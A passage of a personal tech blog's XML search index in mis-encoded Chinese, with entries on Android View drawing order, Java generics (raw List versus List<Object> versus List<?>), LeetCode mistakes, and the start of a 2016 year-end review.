dispatchDraw()ï¼šViewGroupä¼šé‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œç”¨äºŽå¯¹æ‰€æœ‰çš„å­Viewè°ƒç”¨draw()æ–¹æ³•è¿›è¡Œç»˜åˆ¶ onDrawForeground()ï¼šç”¨äºŽç»˜åˆ¶å‰æ™¯ï¼ˆå¦‚æžœéœ€è¦ï¼‰ å¯ä»¥çœ‹åˆ°å¦‚æžœéœ€è¦è°ƒç”¨ä¸Šè¿°çš„æ–¹æ³•å¿…å®šä¼šæŒ‰ç…§è¿™ä¸ªé¡ºåºè¿›è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå­Viewçš„ç»˜åˆ¶æ˜¯åœ¨çˆ¶Viewç»˜åˆ¶ä¹‹åŽè¿›è¡Œçš„ï¼Œè€ŒåŒçº§Viewçš„ç»˜åˆ¶æ˜¯æ ¹æ®Viewåœ¨çˆ¶Viewä¸­çš„é¡ºåºè¿›è¡Œç»˜åˆ¶çš„ã€‚ åŒæ—¶è¿™ä¸ªè¿‡ç¨‹å¯ä»¥é€šè¿‡è°ƒç”¨invalidate()æ¥é‡æ–°è¿›è¡Œï¼Œç›¸å½“äºŽè¿›è¡ŒæŸä¸ªViewçš„é‡ç»˜ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
        <tag>LifeCycle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaæ³›åž‹ä¸­Listã€List&lt;Object&gt;ã€List&lt;?&gt;çš„åŒºåˆ«]]></title>
    <url>%2F2017%2F02%2F14%2FDiffInGeneric%2F</url>
    <content type="text"><![CDATA[Java 1.5ä¸­å¼•å…¥äº†æ³›åž‹çš„æ¦‚å¿µä»¥å¢žåŠ ä»£ç çš„å®‰å…¨æ€§ä¸Žæ¸…æ™°åº¦ï¼ŒåŒæ—¶ä¸ºäº†æä¾›å¯¹æ—§ä»£ç çš„å…¼å®¹æ€§ï¼Œè®©æ—§ä»£ç ä¸ç»è¿‡æ”¹åŠ¨ä¹Ÿå¯ä»¥åœ¨æ–°ç‰ˆæœ¬ä¸­è¿è¡Œï¼ŒJavaæä¾›äº†åŽŸç”Ÿæ€ç±»åž‹ï¼ˆæˆ–ç§°åŽŸå§‹ç±»åž‹ï¼‰ã€‚ä½†æ˜¯å®žé™…ä¸­åœ¨æ–°çš„ä»£ç ä¸­å·²ç»ä¸åº”è¯¥ä½¿ç”¨åŽŸç”Ÿæ€ç±»åž‹ã€‚ åŽŸç”Ÿæ€ç±»åž‹çš„å«ä¹‰æ˜¯ä¸å¸¦ä»»ä½•å®žé™…å‚æ•°çš„æ³›åž‹åç§°ï¼Œä¾‹å¦‚Java 1.5åŽæ”¹ä¸ºæ³›åž‹å®žçŽ°çš„List&lt;E&gt;ï¼ŒListå°±æ˜¯å®ƒçš„åŽŸç”Ÿæ€ç±»åž‹ï¼Œä¸Žæ²¡æœ‰å¼•å…¥æ³›åž‹ä¹‹å‰çš„ç±»åž‹å®Œå…¨ä¸€è‡´ã€‚ è€Œåœ¨è™šæ‹Ÿæœºå±‚é¢ä¸Šï¼Œæ˜¯æ²¡æœ‰æ³›åž‹è¿™ä¸€æ¦‚å¿µçš„â€”â€”æ‰€æœ‰å¯¹è±¡éƒ½å±žäºŽæ™®é€šç±»ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ‰€æœ‰çš„æ³›åž‹ç±»éƒ½ä¼šè¢«è§†ä¸ºåŽŸç”Ÿæ€ç±»åž‹ã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆä¸åº”è¯¥ä½¿ç”¨åŽŸç”Ÿæ€ç±»åž‹å‘¢ï¼Ÿ å¦‚æžœä½¿ç”¨åŽŸç”Ÿæ€ç±»åž‹ï¼Œå°±å¤±æŽ‰äº†æ³›åž‹åœ¨å®‰å…¨æ€§å’Œè¡¨è¿°æ€§æ–¹é¢çš„æ‰€æœ‰ä¼˜åŠ¿ã€‚â€”â€”Effective Java æ³›åž‹çš„ç›®çš„ç®€å•åœ°è¯´å°±æ˜¯å¯ä»¥è®©ä¸€äº›è¿è¡Œæ—¶æ‰èƒ½å‘çŽ°çš„é”™è¯¯å¯ä»¥åœ¨ç¼–è¯‘æœŸé—´å°±å¯ä»¥è¢«ç¼–è¯‘å™¨æ‰€æ£€æµ‹å‡ºï¼Œè¿è¡Œæ—¶å‡ºé—®é¢˜çš„ä»£ä»·ä¸Žç¼–è¯‘æœŸå‡ºçŽ°é—®é¢˜çš„ä»£ä»·çš„å·®åˆ«å¯æƒ³è€ŒçŸ¥ã€‚æ¢å¥è¯è¯´ï¼Œæ³›åž‹æ˜¯ç¼–è¯‘å™¨çš„ä¸€ç§åŠæ—¶å‘çŽ°é”™è¯¯çš„æœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿç»™ç”¨æˆ·å¸¦æ¥äº†ä»£ç çš„æ¸…æ™°ä¸Žç®€æ´çš„é™„åŠ å¥½å¤„ï¼ˆä¸å¿…å†å†™ä¸€äº›å¤æ‚è€Œå±é™©å¹¶ä¸”ä¸ç›´è§‚çš„å¼ºåˆ¶ç±»åž‹è½¬æ¢ï¼‰ã€‚ ä¸‹é¢å°±è¿›å…¥æ­£é¢˜è°ˆè°ˆä»¥Listä¸ºä¾‹æ—¶Listã€List&lt;Object&gt;ã€List&lt;?&gt;çš„åŒºåˆ«ã€‚ å…ˆä¸‹å®šä¹‰ï¼š Listï¼šåŽŸç”Ÿæ€ç±»åž‹ List&lt;Object&gt;ï¼šå‚æ•°åŒ–çš„ç±»åž‹ï¼Œè¡¨æ˜ŽListä¸­å¯ä»¥å®¹çº³ä»»æ„ç±»åž‹çš„å¯¹è±¡ List&lt;?&gt;ï¼šæ— é™å®šé€šé…ç¬¦ç±»åž‹ï¼Œè¡¨ç¤ºåªèƒ½åŒ…å«æŸä¸€ç§æœªçŸ¥å¯¹è±¡ç±»åž‹ ä¸‹é¢çœ‹ä¸€æ®µä»£ç ï¼š 1234567public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); List list = strings;//ok List&lt;Object&gt; objects = strings;//Error: java: incompatible types: java.util.List&lt;java.lang.String&gt; cannot be converted to java.util.List&lt;java.lang.Object&gt; &#125;&#125; æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªList&lt;String&gt;ç±»åž‹çš„å¯¹è±¡stringsï¼Œå†æŠŠå®ƒèµ‹ç»™åŽŸç”Ÿæ€ç±»åž‹Listï¼Œè¿™æ˜¯å¯ä»¥çš„ã€‚ä½†æ˜¯ç¬¬5è¡Œä¸­å°è¯•æŠŠå®ƒä¼ é€’ç»™List&lt;Object&gt;æ—¶ï¼Œå‡ºçŽ°äº†ä¸€ä¸ªç±»åž‹ä¸ç›¸å®¹é”™è¯¯ï¼Œæ³¨æ„ï¼Œè¿™æ˜¯ä¸€ä¸ªç¼–è¯‘æœŸé”™è¯¯ã€‚ è¿™æ˜¯å› ä¸ºæ³›åž‹æœ‰å­ç±»åž‹åŒ–çš„è§„åˆ™ï¼š List&lt;String&gt;æ˜¯åŽŸç”Ÿæ€ç±»åž‹Listçš„ä¸€ä¸ªå­ç±»åž‹ã€‚è™½ç„¶Stringæ˜¯Objectçš„å­ç±»åž‹ï¼Œä½†æ˜¯ç”±äºŽæ³›åž‹æ˜¯ä¸å¯åå˜çš„ï¼ŒList&lt;String&gt;å¹¶ä¸æ˜¯List&lt;Object&gt;çš„å­ç±»åž‹ï¼Œæ‰€ä»¥è¿™é‡Œçš„ä¼ é€’æ— æ³•é€šè¿‡ç¼–è¯‘ã€‚ å¦‚æžœåƒä¸Šé¢é‚£æ ·ä½¿ç”¨åŽŸç”Ÿæ€ç±»åž‹ä¼šæœ‰ä»€ä¹ˆéšæ‚£å‘¢ï¼Ÿçœ‹ä¸‹é¢ä¸€æ®µä»£ç ï¼š 1234567891011public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); unsafeAdd(strings, (Integer)1); System.out.println(strings.get(0)); &#125; private static void unsafeAdd(List list, Object object) &#123; list.add(object); &#125;&#125; ç¼–è¯‘å™¨æç¤ºäº†ä¸¤æ¡è­¦å‘Šï¼š ç¬¬8è¡Œï¼š 123456warning: [rawtypes] found raw type: List private static void unsafeAdd(List list, Object object) &#123; ^ missing type arguments for generic class List&lt;E&gt; where E is a type-variable: E extends Object declared in interface List è­¦å‘Šå‘çŽ°äº†åŽŸç”Ÿæ€ç±»åž‹Listï¼ŒåŒæ—¶è¿˜è´´å¿ƒåœ°æŒ‡å‡ºäº†List&lt;E&gt;çš„å½¢å¼ä»¥åŠEçš„æ¥æºã€‚ ç¬¬9è¡Œï¼š 12345warning: [unchecked] unchecked call to add(E) as a member of the raw type List list.add(object); ^ where E is a type-variable: E extends Object declared in interface List åŒæ ·æŒ‡å‡ºäº†æˆ‘ä»¬æ­£åœ¨æŠŠä¸€ä¸ªå¯¹è±¡æ·»åŠ åˆ°Listä¸­ï¼Œè€Œè¿™ä¸ªæ·»åŠ è¿‡ç¨‹ç”±äºŽæˆ‘ä»¬ä½¿ç”¨äº†åŽŸç”Ÿæ€ç±»åž‹è€Œæ— æ³•è¢«æ£€éªŒã€‚ å¦‚æžœå¿½ç•¥è¿™ä¸¤æ¡è­¦å‘Šå¹¶è¿è¡Œè¿™ä¸ªç¨‹åºï¼Œæ˜¾ç„¶ä¼šå‡ºçŽ°ä¸€æ¡é”™è¯¯ï¼š ç¬¬5è¡Œï¼š 1Exception in thread "main" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String æˆ‘ä»¬è¯•å›¾æŠŠä¸€ä¸ªè‡ªåŠ¨è£…ç®±åŽçš„Integerå¯¹è±¡æ’å…¥åˆ°äº†ä¸€ä¸ªè¢«å£°æ˜Žä¸ºList&lt;String&gt;çš„Listä¸­ï¼Œç”±äºŽæˆ‘ä»¬åœ¨unsafeAddæ–¹æ³•ä¸­ä½¿ç”¨äº†åŽŸç”Ÿæ€ç±»åž‹ï¼Œä»Žè€Œä½¿å¾—ç¼–è¯‘å™¨æ— æ³•åœ¨ç¼–è¯‘æœŸé—´æ£€æŸ¥addå‚æ•°çš„åˆæ³•æ€§ï¼Œä»Žè€Œæ²¡æœ‰äº§ç”Ÿç¼–è¯‘é”™è¯¯è€Œæ˜¯äº§ç”Ÿäº†ä¸€æ¡è­¦å‘Šï¼Œè¿è¡ŒåŽå½“è¯•å›¾æŠŠè¿™ä¸ªé”™è¯¯çš„Integerå¯¹è±¡ä½œä¸ºStringå–å‡ºæ—¶å°±ä¼šå‡ºçŽ°ClassCaseExceptionå¼‚å¸¸ï¼Œè¿™æ˜¯ä¸ªè¿è¡Œæ—¶çš„å¼‚å¸¸ï¼Œå¯¼è‡´äº†ç¨‹åºä¸­æ–­ã€‚ å¦‚æžœæˆ‘ä»¬æŠŠunsafeAddæ–¹æ³•çš„å‚æ•°ä»ŽListæ”¹ä¸ºList&lt;Object&gt;ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿæ­£å¦‚ä¹‹å‰æ‰€è¯´çš„é‚£æ ·ï¼Œç”±äºŽList&lt;String&gt;å¹¶ä¸æ˜¯List&lt;Object&gt;çš„å­ç±»åž‹ï¼Œæ‰€ä»¥åœ¨ä¼ é€’å‚æ•°çš„æ—¶å€™å°±ä¼šå‡ºçŽ°ç¬¬ä¸€æ®µä»£ç ä¸­å‡ºçŽ°çš„ç¼–è¯‘æœŸé”™è¯¯ã€‚è¿™ä½“çŽ°äº†æ³›åž‹æ‰€å¸¦æ¥çš„å®‰å…¨æ€§ã€‚ å¯ä»¥è¿™ä¹ˆè¯´ï¼ŒList&lt;Object&gt;å”¯ä¸€ç‰¹æ®Šçš„åœ°æ–¹åªæ˜¯Objectæ˜¯æ‰€æœ‰ç±»åž‹çš„è¶…ç±»ï¼Œç”±äºŽæ³›åž‹çš„ä¸å¯åå˜æ€§ï¼Œå®ƒåªèƒ½è¡¨ç¤ºListä¸­å¯ä»¥å®¹çº³æ‰€æœ‰ç±»åž‹çš„å¯¹è±¡ï¼Œå´ä¸èƒ½è¡¨ç¤ºä»»ä½•å‚æ•°ç±»åž‹çš„List&lt;E&gt;ã€‚ è€ŒList&lt;?&gt;åˆ™æ˜¯é€šé…ç¬¦ç±»åž‹ä¸­çš„ä¸€ç§ç‰¹ä¾‹ï¼Œå®ƒå¹¶æ²¡æœ‰extendæˆ–superè¿™æ ·çš„é™åˆ¶ï¼Œä»Žè€Œå¯ä»¥åšåˆ°å¼•ç”¨ä»»æ„å‚æ•°ç±»åž‹çš„List&lt;E&gt;ã€‚ä½†ç”±äºŽæ²¡æœ‰è¡¨ç¤ºç±»åž‹çš„ç¬¦å·ï¼ˆEï¼‰ï¼Œåœ¨æ–¹æ³•ä¸­æ— æ³•å¼•ç”¨è¿™ä¸ªç±»åž‹ï¼Œæ‰€ä»¥å®ƒåªç”¨äºŽæ— éœ€ä½¿ç”¨å…·ä½“ç±»åž‹çš„æ–¹æ³•ä¹‹ä¸­ï¼Œå¦‚æžœä¸æ˜¯è¿™ä¸ªæƒ…å†µï¼Œåˆ™éœ€è¦ä½¿ç”¨æ³›åž‹æ–¹æ³•ï¼ˆåªç”¨List&lt;?&gt;çš„ä¸æ˜¯ä¸€ä¸ªæ³›åž‹æ–¹æ³•ï¼Œå®ƒå…·æœ‰List&lt;?&gt;è¿™ä¸ªå›ºå®šçš„å‚æ•°`ï¼‰ã€‚ ä½†æ˜¯List&lt;?&gt;è¿˜æ˜¯ä¸èƒ½ç”¨ä½œä¸Šé¢çš„unsafeAddçš„å‚æ•°ï¼Œä¿®æ”¹åŽä¼šå‡ºçŽ°ä¸€æ¡å¥‡æ€ªçš„ç¼–è¯‘é”™è¯¯ï¼š 123456789error: no suitable method found for add(Object) list.add(object); ^ method Collection.add(CAP#1) is not applicable (argument mismatch; Object cannot be converted to CAP#1) method List.add(CAP#1) is not applicable (argument mismatch; Object cannot be converted to CAP#1) where CAP#1 is a fresh type-variable: CAP#1 extends Object from capture of ? è¿™æ˜¯å› ä¸ºæ— æ³•å°†ä»»ä½•å…ƒç´ ï¼ˆnullé™¤å¤–ï¼‰æ”¾å…¥List&lt;?&gt;ä¸­ã€‚è¿™åˆæ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå…ˆæ¥çœ‹ä¸€ä¸ªæœ‰é™å®šé€šé…ç¬¦çš„ä¾‹å­ï¼š 123456789public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;? extends Number&gt; numbers = new ArrayList&lt;Integer&gt;(); numbers= new ArrayList&lt;Double&gt;(); numbers= new ArrayList&lt;Float&gt;(); numbers = new ArrayList&lt;Number&gt;(); numbers.add(new Integer(1)); &#125;&#125; ç¬¬7è¡ŒæŠ¥å‡ºäº†ä¸Žä¹‹å‰ç›¸ä¼¼çš„ç¼–è¯‘é”™è¯¯ï¼š 123456789error: no suitable method found for add(Integer) numbers.add(new Integer(1)); ^ method Collection.add(CAP#1) is not applicable (argument mismatch; Integer cannot be converted to CAP#1) method List.add(CAP#1) is not applicable (argument mismatch; Integer cannot be converted to CAP#1) where CAP#1 is a fresh type-variable: CAP#1 extends Number from capture of ? extends Number è¿™æ¬¡æˆ‘ä»¬å¯ä»¥çœ‹å‡ºé”™è¯¯çš„åŽŸå› ï¼šå¯ä»¥å°†ä¸€ä¸ªList&lt;Integer&gt;ä¼ é€’ç»™List&lt;? extends Number&gt;ï¼Œå› ä¸ºIntegeræ˜¯Numberçš„å­ç±»ï¼Œç¬¦åˆé™å®šç¬¦çš„æ¡ä»¶ã€‚åŒç†ï¼Œä¹Ÿå¯ä»¥å°†ç±»ä¼¼çš„å¯¹è±¡ä¼ é€’ç»™å®ƒï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŠŠList&lt;Number&gt;ä¼ é€’ç»™å®ƒã€‚ å¦‚æžœå…è®¸è¿™ä¸ªå¯¹è±¡çš„addæ“ä½œï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“è¿™ä¸ªå‚æ•°æ˜¯å¦ä¸Žå¯¹è±¡çš„æ³›åž‹å‚æ•°ç›¸åŒï¼Œå› ä¸ºæˆ‘ä»¬åªçŸ¥é“å®ƒæ˜¯Numberçš„ä¸€ä¸ªå­ç±»ã€‚ 123List&lt;? extends Parent&gt; list = new ArrayList&lt;Child&gt;();List&lt;? extends Parent&gt; parents = list;list.add(new Parent()); ä¸Šé¢çš„1,2ä¸¤è¡Œæ˜¯å®Œå…¨åˆæ³•çš„ï¼Œå¦‚æžœå…è®¸ç¬¬3è¡Œçš„addæ“ä½œï¼Œé‚£ä¹ˆä¼šæŠŠä¸€ä¸ªParentå¯¹è±¡åŠ å…¥åˆ°ä¸€ä¸ªå®žé™…ç±»åž‹æ˜¯Childçš„Listä¸­ï¼Œè€ŒParentis-not-a Childï¼Œè¿™ç ´åäº†Javaçš„ç±»åž‹å®‰å…¨ï¼Œæ˜¯ç»å¯¹ä¸å…è®¸çš„ã€‚ ä¸Šé¢æ˜¯æœ‰é™åˆ¶é€šé…ç¬¦çš„æƒ…å†µï¼Œé‚£ä¹ˆé’ˆå¯¹List&lt;?&gt;è¿™æ ·çš„æ— é™åˆ¶é€šé…ç¬¦æ›´æ˜¯å¦‚æ­¤ã€‚å› æ­¤ï¼Œä¸ºäº†ä¿è¯ç±»åž‹å®‰å…¨ï¼Œä¸å…è®¸å¯¹List&lt;?&gt;æˆ–List&lt;? extends E&gt;è¿™æ ·çš„é€šé…ç¬¦ç±»åž‹è¿›è¡Œç±»ä¼¼addçš„æ“ä½œã€‚ ä½¿ç”¨æ³›åž‹æ–¹æ³•å¯ä»¥é¿å…è¿™ä¸ªé—®é¢˜ï¼ˆé‡ç”³é€šé…ç¬¦ç±»åž‹å¹¶ä¸æ˜¯æ³›åž‹æ–¹æ³•ï¼‰ï¼Œä½¿ç”¨æ— é™åˆ¶é€šé…ç¬¦ç±»åž‹å¯ä»¥å–ä»£å…¶ä»–éœ€è¦è¡¨ç¤ºåŒ…å«æŸä¸€ç§å¯¹è±¡ç±»åž‹çš„æ³›åž‹ç±»åž‹çš„æƒ…å†µè€Œä¸æ˜¯ä½¿ç”¨åŽŸç”Ÿæ€ç±»åž‹Listã€‚]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCodeè¸©å‘é›†é”¦]]></title>
    <url>%2F2017%2F02%2F05%2FLeetCode%2F</url>
    <content type="text"><![CDATA[å†™åœ¨å‰é¢å¯’å‡ï¼ˆå‡è£…ï¼‰çœ‹å®Œã€Šæ•°æ®ç»“æž„ä¸Žç®—æ³•åˆ†æžã€‹ä¹‹åŽå†³å®šæ˜¯æ—¶å€™å¼€å§‹åšLeetCodeçš„é¢˜ç›®äº†ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸‹ä¸€äº›LeetCodeè¿‡ç¨‹ä¸­é‡åˆ°çš„å‘ï¼ŒåšLeetCodeä¸ä»…æ˜¯å¯¹ç®—æ³•çš„ä¸€ç§è€ƒéªŒï¼Œä¹Ÿæ˜¯å¯¹JavaåŸºç¡€çŸ¥è¯†çš„ä¸€ç§è€ƒæŸ¥ï¼Œåœ¨JavaåŸºç¡€å¹¶ä¸æ˜¯å¤ªå¥½çš„çŽ°åœ¨åšä¸€å®šä¼šæ¼æ´žç™¾å‡ºï¼Œåœ¨è¿™é‡Œç»Ÿä¸€åšä¸€ä¸ªè®°å½•ï¼Œä¹Ÿä¼šå†™ä¸‹å¯¹ä¸€äº›é¢˜ç›®çš„æƒ³æ³•ã€‚ LeetCodeTwo Sumç›´è§‚ä¸Šçš„æ–¹æ³•æ˜¯éåŽ†æ‰€æœ‰å…ƒç´ å¯¹æ‰¾å‡ºç­”æ¡ˆï¼Œçœ‹äº†è§£ç­”ä»¥åŽå‘çŽ°å¯ä»¥ç”¨Hashè¡¨å®žçŽ°ï¼ŒHashè¡¨å¯ä»¥è¿›è¡Œå¯¹å¦ä¸€ä¸ªå…ƒç´ çš„å¿«é€ŸæŸ¥æ‰¾å¹¶è¿”å›žå¯¹åº”çš„ä½ç½®ã€‚ 12345678910111213public static int[] twoSum(int[] nums, int target) &#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; map.put(nums[i], i); &#125; for (Integer num : map.keySet()) &#123; if (map.containsKey(target - num) &amp;&amp; !Objects.equals(map.get(num), map.get(target - num))) &#123; return new int[]&#123;map.get(num), map.get(target - num)&#125;; &#125; &#125; return null;&#125; ä¸Šé¢çš„ä»£ç åœ¨ç”¨ä¾‹[3,3] 6çš„æ—¶å€™è¿”å›žç»“æžœä¸ºnullï¼ŒåŽŸå› æ˜¯ç¬¬7è¡Œä¸­ç¬¬äºŒä¸ªåˆ¤æ–­æ¡ä»¶ä¸æˆç«‹ï¼Œç”±äºŽæž„å»ºhashè¡¨çš„æ—¶å€™åŽé¢ä¸€ä¸ª[3,1]è¦†ç›–äº†å‰é¢çš„[3,0]å¯¼è‡´æ— æ³•åŒæ—¶æ‰¾åˆ°ä¸¤ä¸ªä½ç½®ã€‚ï¼ˆæé†’äº†hashè¡¨ä¸€å¯¹ä¸€çš„æ€§è´¨ï¼ŒåŽé¢åŠ å…¥çš„å…ƒç´ å¦‚æžœkeyç›¸åŒä¼šè¦†ç›–å‰é¢çš„å…ƒç´ ï¼‰ è§£å†³åŠžæ³•æ˜¯ä¸éåŽ†keyè€Œæ˜¯ç›´æŽ¥éåŽ†numsæ•°ç»„ï¼Œæ¯”è¾ƒå¾ªçŽ¯çš„ç´¢å¼•å’Œhashè¡¨çš„valueï¼Œè¿™æ ·å¯ä»¥ä¿è¯æ‰¾åˆ°å¯¹åº”çš„é‚£ä¸ªä½ç½®ä¸åŒçš„å…ƒç´ ä½ç½®ã€‚ Rotate Array12345678910public static void rotate(int[] nums, int k) &#123; for (int i = 0; i &lt; k; i++) &#123; int[] temp = new int[nums.length]; temp[0] = nums[nums.length - 1]; for (int j = 0; j &lt; nums.length-1; j++) &#123; temp[j + 1] = nums[j]; &#125; nums = temp; &#125;&#125; é”™è¯¯çš„åŽŸå› æ˜¯æ²¡æœ‰ç†è§£æ•°ç»„å…ƒç´ ä¼ é€’çš„æœ¬è´¨æ˜¯å¯¹æ•°ç»„å¯¹è±¡å¼•ç”¨çš„å€¼ä¼ é€’ï¼Œåˆšå¼€å§‹çœ‹åˆ°è¿™é¢˜ç›®è§‰å¾—æ€Žä¹ˆå¯ä»¥ç”¨javaåšï¼Œjavaéƒ½æ˜¯å€¼ä¼ é€’æ— æ³•æ”¹å˜åŽŸæ¥æ•°ç»„ã€‚ä¸Šé¢çš„åšæ³•çš„ç»“æžœæ˜¯æŠŠä¸€ä¸ªæ–°çš„æ•°ç»„å¯¹è±¡çš„å¼•ç”¨èµ‹ç»™äº†numsçš„ä¸€ä¸ªæ‹·è´ï¼Œä½†æ˜¯åŽŸæ¥çš„numså¹¶æ²¡æœ‰å¼•ç”¨åˆ°æ–°çš„åœ°å€ï¼Œæ‰€ä»¥åŽŸnumsè¿˜æ˜¯ä¿æŒä¸å˜ã€‚ æŸ¥äº†ç›¸å…³èµ„æ–™äº†è§£åˆ°æ•°ç»„å…ƒç´ çš„ä¼ é€’ä¸Žå¯¹è±¡ä¸€æ ·ï¼ˆæ•°ç»„ä¹Ÿå¯ä»¥çœ‹æˆnew int[]äº§ç”Ÿçš„å¯¹è±¡ï¼‰ï¼Œä¼ é€’çš„æ˜¯æ•°ç»„çš„å¼•ç”¨çš„æ‹·è´ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå¼•ç”¨æ¥ä¿®æ”¹åŽŸæ•°ç»„çš„æ•°æ®ã€‚]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016å¹´åº¦æ€»ç»“]]></title>
    <url>%2F2017%2F01%2F20%2F2016%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[2016å¹´åº¦æ€»ç»“å†™åœ¨å‰é¢è®¸å¤šäººåœ¨è·Ÿæˆ‘èŠå¤©çš„æ—¶å€™æ„Ÿæ…¨ï¼Œæ—¶é—´æ€Žä¹ˆè¿‡å¾—è¿™ä¹ˆå¿«ï¼Œä¸çŸ¥ä¸è§‰è‡ªå·±å°±æ˜¯äºŒåå¤šçš„äººäº†ï¼Œè¿‡å‡ å¹´å°±è¦å¥”ä¸‰äº†ã€‚ç›¸ååœ°ï¼Œæˆ‘å´è§‰å¾—æ—¶é—´è¿‡å¾—å´ä¸æ˜¯é‚£ä¹ˆå¿«ï¼Œå› ä¸ºè‡ªå·±ç¡®å®žåœ¨éšç€æ—¶é—´è€Œæ”¹å˜ï¼Œè€Œä¸”è¿™æ ·çš„æ”¹å˜æ˜¯è‡ªå·±å®žå®žåœ¨åœ¨å¯ä»¥æ„Ÿå—åˆ°çš„ã€‚ä»Žåˆä¸­å¼€å§‹è¿‡æ¥çš„è¿™å‡ å¹´ï¼Œå¯ä»¥è¯´æ˜¯ä¸€å¹´ä¸€ä¸ªæ ·å­ï¼Œæ¯æ¬¡ç¿»çœ‹è‡ªå·±ä¸€å¹´å‰å†™çš„ä¸œè¥¿éƒ½ä¼šçœ‹åˆ°å½“æ—¶çš„å¹¼ç¨šä¸Žæ— çŸ¥ï¼Œè‡ªå·±ä¹Ÿæœ‰ç€è®¸è®¸å¤šå¤šçš„ä¹ æƒ¯ã€çœ‹æ³•ã€è®¤è¯†åœ¨éšç€æ—¶é—´æŽ¨ç§»åœ¨æ”¹å˜ç€ã€‚ è€Œ2016å¹´æ˜¯å¯¹èº«è¾¹æ¯ä¸€ä¸ªåƒæˆ‘ä¸€æ ·çš„æ–°ç”Ÿéƒ½ååˆ†å…³é”®çš„ä¸€å¹´ï¼Œç»åŽ†äº†èº«ä»½ã€æ—¶ç©ºçš„è½¬å˜ï¼Œå¸¦æ¥çš„æ˜¯å„ç§è§‚å¿µçš„è¿…é€Ÿå˜åŒ–ï¼Œä½†æ„Ÿåˆ°åº†å¹¸çš„æ˜¯æˆ‘å¹¶ä¸æƒ§æ€•æ”¹å˜ã€‚ è¿™å¤§æ¦‚å°±æ˜¯è¿™æ®µæ—¶é—´çš„å¿…ç„¶ï¼Œæˆ‘ä»¬åœ¨å¿«é€Ÿæˆé•¿ç€ï¼Œä¸æ–­åœ°ä¸¢ä¸‹ä¹‹å‰çš„æƒ³æ³•ï¼Œä¸æ–­èŽ·å–æ–°çš„ä¸œè¥¿ä¸Žè®¤çŸ¥ï¼Œä¸çŸ¥é“è¿™æ ·çš„æ”¹å˜è¿˜ä¼šæŒç»­å¤šä¹…ï¼Œä½†æ˜¯å¯ä»¥ç¡®å®šçš„æ˜¯æˆ‘ç¡®å®žæ˜¯åœ¨æœç€å¯¹çš„æ–¹å‘æˆé•¿ç€ã€‚ ä¹‹å‰çš„ä¹ æƒ¯æ˜¯åœ¨æ¯å¹´ç”Ÿæ—¥çš„æ—¶å€™å†™ä¸‹ä¸€äº›ä¸œè¥¿ä½œä¸ºè®°å½•ï¼Œä½†æ˜¯ä»Šå¹´å› ä¸ºå¿™ç¢Œè€Œè½ä¸‹äº†ï¼Œåœ¨å­¦æœŸç»“æŸçš„æ—¶å€™æ­£å¥½è‡ªå·±æ‰€åœ¨çš„ä¸¤ä¸ªå›¢é˜Ÿéƒ½è¦æ±‚æœ‰ä¸€ç¯‡æ€»ç»“ï¼Œè™½ç„¶åˆ†åˆ«æ˜¯å¹´åº¦çš„å’Œå­¦æœŸçš„ï¼Œæˆ‘è¿˜æ˜¯ä¸€å¹¶å†™æˆå¹´åº¦çš„ï¼Œå¤§æ¦‚é«˜ä¸­æ—¶æœŸçš„é‚£äº›ç§ç§åœ¨çŽ°åœ¨çœ‹æ¥æ¯•ç«Ÿæ˜¯è¿‡åŽ»äº†ï¼Œæ‰€ä»¥è¿™ç¯‡æ€»ç»“ä¼šåˆ†æˆä¸¤éƒ¨åˆ†ï¼Œå…ˆæ˜¯æ¥åŽç§‘å‰çš„æ—¶æœŸï¼Œä¸»è¦å†…å®¹åœ¨æ¥åŽç§‘åŽçš„æ—¶æœŸã€‚ä½œä¸ºä¸€ç¯‡å†™ç»™åˆ«äººçœ‹çš„æ€»ç»“å°±ä¸åŒ…å«é‚£äº›ç”Ÿæ´»ä¸Šçš„ä¸œè¥¿äº†ã€‚ é«˜ä¸­ä¼¼ä¹Žèº«è¾¹æ¯ä¸€ä¸ªäººè¯´èµ·è‡ªå·±çš„é«˜ä¸‰æ—¶å…‰ï¼Œéƒ½æ˜¯æ— å°½çš„è€ƒè¯•å’Œè¡¥è¯¾ï¼Œå’Œæœ€ç»ˆé‚£ä¸€æ¬¡é«˜è€ƒçš„ç§ç§ç»åŽ†ã€‚åœ¨è¿™ä¸ªæ˜Žç¡®çš„äººç”Ÿåˆ†æ°´å²­ä¹‹å‰ï¼Œæ¯ä¸ªäººéƒ½ä¸å¾—ä¸æ­£è§†è‡ªå·±çš„æˆç»©ã€‚ ä½†å¥‡æ€ªï¼ˆæˆ–è®¸ä¸ï¼‰çš„æ˜¯ï¼Œæˆ‘å¯¹é«˜ä¸­çš„å°è±¡å´å®Œå®Œå…¨å…¨æ²¡æœ‰ä¸Šé¢è¯´çš„é‚£äº›ä¸œè¥¿ï¼Œå› 